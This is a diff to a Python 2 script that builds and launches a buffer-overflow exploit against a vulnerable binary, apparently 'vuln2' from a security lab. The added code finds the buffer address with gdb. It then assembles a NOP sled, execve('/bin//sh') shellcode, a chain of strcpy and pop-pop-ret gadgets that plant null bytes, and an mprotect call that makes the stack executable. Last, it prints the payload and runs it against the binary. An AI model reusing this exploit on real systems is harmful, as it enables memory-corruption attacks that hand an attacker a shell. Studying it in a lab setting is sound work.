@@ -127,7 +127,23 @@ def find_null_byte(vuln_bin, libc_base_addr):
     null_byte_location = libc_base_addr + bin_sh_offset + len("/bin/sh")
     return null_byte_location
 
+
+def find_buff_addr(vuln_bin):
+
+    with io.FileIO("find_buf.gdb", "w") as file:
+        file.write("b main\nrun hello\np/x &buf[0]\n")
+   
+    cmd = "gdb --batch --command=./find_buf.gdb --args "
+    cmd = cmd + vuln_bin
+    cmd = cmd + " hello|tail -1|awk '{print $3}'"
     
+    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+    proc.wait()
+    buf_addr = int(proc.stdout.read(), 16) + 0xb0 - 0x180
+
+    os.remove("./find_buf.gdb")
+    return buf_addr
+ 
 def find_3pop_ret(instr_list, ret_index):
 	# find pop, pop, pop, ret
     found = False
@@ -362,5 +378,81 @@ if __name__ == '__main__':
         exit(8)
     print 'Null byte present at 0x%x' %(null_byte)
 
+    buf_addr = find_buff_addr(args.vuln_bin)
+    if buf_addr == None:
+        print 'Unable to find buffer address of vulnerable binary !'
+        exit(9)
+    print 'Buffer address of vulnerable binary is 0x%x' %(buf_addr)
 
+    
+    # build payload
+
+    # JUNK + SYSTEM + EXIT + SYSTEM_ARG
+    buf = "\x90" * 199
+    buf += "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+    buf += struct.pack("<I",strcpy_addr) * 9
+
+    constant = 0x17c
+    buf += struct.pack("<I",strcpy_addr)
+    buf += struct.pack("<I",pop_pop_ret_addr)
+    buf += struct.pack("<I",buf_addr + constant)
+    buf += struct.pack("<I",null_byte)
+
+    buf += struct.pack("<I",strcpy_addr)
+    buf += struct.pack("<I",pop_pop_ret_addr)
+    buf += struct.pack("<I",buf_addr + constant + 4)
+    buf += struct.pack("<I",null_byte)
+
+    buf += struct.pack("<I",strcpy_addr)
+    buf += struct.pack("<I",pop_pop_ret_addr)
+    buf += struct.pack("<I",buf_addr + constant + 6)
+    buf += struct.pack("<I",null_byte)
+
+    buf += struct.pack("<I",strcpy_addr)
+    buf += struct.pack("<I",pop_pop_ret_addr)
+    buf += struct.pack("<I",buf_addr + constant + 7)
+    buf += struct.pack("<I",null_byte)
+
+    buf += struct.pack("<I",strcpy_addr)
+    buf += struct.pack("<I",pop_pop_ret_addr)
+    buf += struct.pack("<I",buf_addr + constant + 9)
+    buf += struct.pack("<I",null_byte)
+
+    buf += struct.pack("<I",strcpy_addr)
+    buf += struct.pack("<I",pop_pop_ret_addr)
+    buf += struct.pack("<I",buf_addr + constant + 0xa)
+    buf += struct.pack("<I",null_byte)
+
+    buf += struct.pack("<I",strcpy_addr)
+    buf += struct.pack("<I",pop_pop_ret_addr)
+    buf += struct.pack("<I",buf_addr + constant + 0xb)
+    buf += struct.pack("<I",null_byte)
+
+    page_address = ((buf_addr >> 12) << 12) + 0x7f
+    mem_length = 0x7f7f107f
+    permissions = 0x7f7f7f07
+    return_address = buf_addr
+
+    buf += struct.pack("<I",mprotect_addr)
+    buf += struct.pack("<I",pop_pop_pop_ret_addr)
+    buf += struct.pack("<I",page_address)
+    buf += struct.pack("<I",mem_length)
+    buf += struct.pack("<I",permissions)
+    buf += struct.pack("<I",return_address)
+
+    rows, columns = os.popen('stty size', 'r').read().split()
+    print "#"*int(columns)
+    print "Run the following command as the argument of vuln2 to reproduce this exploit.\n"
+    print "#"*int(columns)
+    bufstr = buf.encode("hex")
+    i = 0
+    exploit_str = ""
+    while i < len(bufstr) - 1:
+        exploit_str += "\\x" + bufstr[i] + bufstr[i+1]
+        i += 2
+    print "`python -c \'print \"" + exploit_str + "\"\'`"
+    print ""
+    print "#"*int(columns)
+
+    subprocess.call([args.vuln_bin, buf])
 
